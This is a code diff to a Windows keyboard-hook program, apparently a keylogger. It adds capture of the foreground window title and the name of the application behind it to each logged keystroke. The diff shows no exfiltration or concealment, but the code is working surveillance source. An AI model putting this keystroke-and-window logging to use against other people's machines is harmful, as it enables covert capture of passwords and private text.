@@ -3,6 +3,7 @@
 #include <chrono>
 #include <cstdio>
 #include <string>
+#include <psapi.h>
 
 #include "keylogger_win.hpp"
 
@@ -60,6 +61,73 @@ static std::string vkToString(DWORD vk, DWORD scanCode) {
             return tmp;
         }
     }
+}
+
+// ---- active window info ----------------------------------------------------
+
+struct WindowInfo { std::string app; std::string title; };
+
+static std::string wideToUtf8(const WCHAR* ws, int len = -1) {
+    if (!ws || (len == 0)) return {};
+    if (len < 0) len = static_cast<int>(wcslen(ws));
+    int n = WideCharToMultiByte(CP_UTF8, 0, ws, len, nullptr, 0, nullptr, nullptr);
+    if (n <= 0) return {};
+    std::string out(n, '\0');
+    WideCharToMultiByte(CP_UTF8, 0, ws, len, &out[0], n, nullptr, nullptr);
+    return out;
+}
+
+static WindowInfo getActiveWindowInfo() {
+    WindowInfo info;
+    HWND hwnd = GetForegroundWindow();
+    if (!hwnd) return info;
+
+    WCHAR titleBuf[512];
+    int titleLen = GetWindowTextW(hwnd, titleBuf, 512);
+    if (titleLen > 0)
+        info.title = wideToUtf8(titleBuf, titleLen);
+
+    DWORD pid = 0;
+    GetWindowThreadProcessId(hwnd, &pid);
+    if (pid) {
+        HANDLE proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+        if (proc) {
+            WCHAR exePath[MAX_PATH];
+            DWORD exeLen = MAX_PATH;
+            if (QueryFullProcessImageNameW(proc, 0, exePath, &exeLen) && exeLen > 0) {
+                const WCHAR* base = exePath;
+                for (DWORD i = 0; i < exeLen; ++i) {
+                    if (exePath[i] == L'\\' || exePath[i] == L'/')
+                        base = exePath + i + 1;
+                }
+                std::string name = wideToUtf8(base);
+                if (name.size() > 4) {
+                    auto ext = name.substr(name.size() - 4);
+                    if (ext == ".exe" || ext == ".EXE")
+                        name.resize(name.size() - 4);
+                }
+                info.app = std::move(name);
+            }
+            CloseHandle(proc);
+        }
+    }
+    return info;
+}
+
+static WindowInfo getCachedWindowInfo() {
+    static HWND lastHwnd = nullptr;
+    static WindowInfo cached;
+
+    HWND hwnd = GetForegroundWindow();
+    if (hwnd != lastHwnd) {
+        cached = getActiveWindowInfo();
+        lastHwnd = hwnd;
+    } else {
+        WCHAR titleBuf[512];
+        int titleLen = GetWindowTextW(hwnd, titleBuf, 512);
+        cached.title = (titleLen > 0) ? wideToUtf8(titleBuf, titleLen) : std::string{};
+    }
+    return cached;
 }
 
 // ---- global hook pointer ---------------------------------------------------
@@ -128,6 +196,10 @@ LRESULT CALLBACK WindowsKeylogger::hookProc(int code, WPARAM wp, LPARAM lp) {
             std::chrono::duration_cast<std::chrono::milliseconds>(
                 std::chrono::system_clock::now().time_since_epoch()).count());
         ev.keyDown = down;
+
+        auto wi = getCachedWindowInfo();
+        ev.appName     = std::move(wi.app);
+        ev.windowTitle = std::move(wi.title);
 
         std::lock_guard<std::mutex> lk(g_instance->m_mu);
         if (g_instance->m_callback) g_instance->m_callback(ev);
